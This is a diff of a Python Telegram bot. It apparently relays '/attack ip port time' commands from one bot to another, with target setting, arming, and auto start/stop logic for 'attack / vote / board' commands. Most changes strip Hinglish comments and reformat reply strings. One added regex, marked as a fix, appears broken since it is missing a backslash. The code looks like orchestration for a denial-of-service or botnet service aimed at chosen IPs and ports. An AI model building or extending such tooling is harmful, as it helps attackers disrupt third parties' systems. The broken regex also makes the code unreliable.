@@ -43,8 +43,6 @@ async def try_execute(cid: int):
     if not state["target"]:
         return
 
-    # yahan cmd already full hai (/attack ip port time),
-    # target sirf info ke liye store hai, chaho to logs me use karo
     cmd = state["pending_cmd"]
     state["current_cmd"] = cmd
     state["pending_cmd"] = None
@@ -75,6 +73,7 @@ async def ip_bot_listener(event):
     text = event.text or ""
     print("📩 IP BOT REPLY:", text)
 
+    # FIX: regex me s
     m = re.search(r"CMD:s*(.+)", text)
     if not m:
         return
@@ -88,7 +87,6 @@ async def ip_bot_listener(event):
         if not state["armed"]:
             continue
         if not state["target"]:
-            # agar target set nahi hai to skip
             continue
 
         if cmd == state["current_cmd"]:
@@ -142,7 +140,6 @@ async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
     target = " ".join(context.args).strip()
     state = chat_state.get(cid)
     if not state:
-        # agar FSM abhi start nahi hua, basic state bana do
         chat_state[cid] = {
             "armed": False,
             "bot_ready": False,
@@ -154,7 +151,10 @@ async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         state["target"] = target
 
-    await update.message.reply_text(f"✅ Target saved: `{target}`", parse_mode="Markdown")
+    await update.message.reply_text(
+        f'''✅ Target saved: `{target}`''',
+        parse_mode="Markdown",
+    )
 
 
 async def start_fsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -172,13 +172,10 @@ async def start_fsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
 
     await update.message.reply_text(
-        "✅ Event-driven mode ON.
-"
-        "• /setlinkchatid se target set karo.
-"
-        "• IP BOT se aane wale CMD: (attack / vote / board) auto handle honge.
-"
-        "• BOT_B READY pe pending CMD auto start, same CMD ignore, naya pe /stop + start."
+        '''✅ Event-driven mode ON.
+• /setlinkchatid se target set karo.
+• IP BOT se aane wale CMD: (attack / vote / board) auto handle honge.
+• BOT_B READY pe pending CMD auto start, same CMD ignore, naya pe /stop + start.'''
     )
 
 
